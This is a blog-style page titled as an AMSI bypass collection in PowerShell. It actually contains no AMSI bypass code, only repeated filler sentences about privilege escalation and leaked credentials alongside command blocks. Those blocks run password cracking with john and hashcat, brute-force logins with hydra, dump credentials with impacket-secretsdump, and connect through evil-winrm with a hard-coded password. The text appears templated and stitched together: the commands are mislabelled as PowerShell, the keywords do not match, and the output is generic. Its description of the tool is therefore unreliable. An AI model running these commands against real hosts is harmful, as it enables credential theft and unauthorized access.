---
TitleSEO: "AMSI Bypass Collection in PowerShell | ZureFX"
TitlePost: "AMSI Bypass Collection — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for amsi bypass collection. Built for security research and automation."
Keywords: "rust, tool, scanner, fuzzer, automation, powershell"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-446.html"
URL_IMAGES: ""
Date: "2024-10-10"
Tags: "Rust, Tool, Scanner, Fuzzer, Automation, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-446"
Permalink: "/scripting/script-amsi-bypass-collection-446.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `lookupsid`
- `psexec`
- `ligolo-ng`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.68.124.185/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p21,464,1521 10.23.152.125 -oN scan.txt
nmap -sCV -p110,389,1521 10.95.131.180 -oN scan.txt
evil-winrm -i 10.26.53.211 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.41.61/FUZZ
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.15.91.244 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.82.206.85
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.28.42
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 11.82s
```
